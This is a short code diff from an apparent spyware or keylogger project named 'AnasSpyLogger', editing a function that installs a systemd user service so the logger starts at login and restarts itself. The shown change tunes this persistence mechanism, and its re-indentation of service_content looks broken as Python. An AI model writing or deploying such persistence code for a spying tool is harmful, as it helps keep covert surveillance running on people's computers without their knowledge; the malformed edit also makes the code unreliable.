@@ -149,13 +149,16 @@ def persist_script():
 
         service_file_path = os.path.join(user_service_path, "anaspylogger.service")
 
-        service_content = f"""[Unit]
+
+service_content = f"""[Unit]
 Description=AnasSpyLogger Persistence Service
+After=network.target
 
 [Service]
+Type=simple
 ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
 Restart=always
-RestartSec=15
+RestartSec=10
 
 [Install]
 WantedBy=default.target
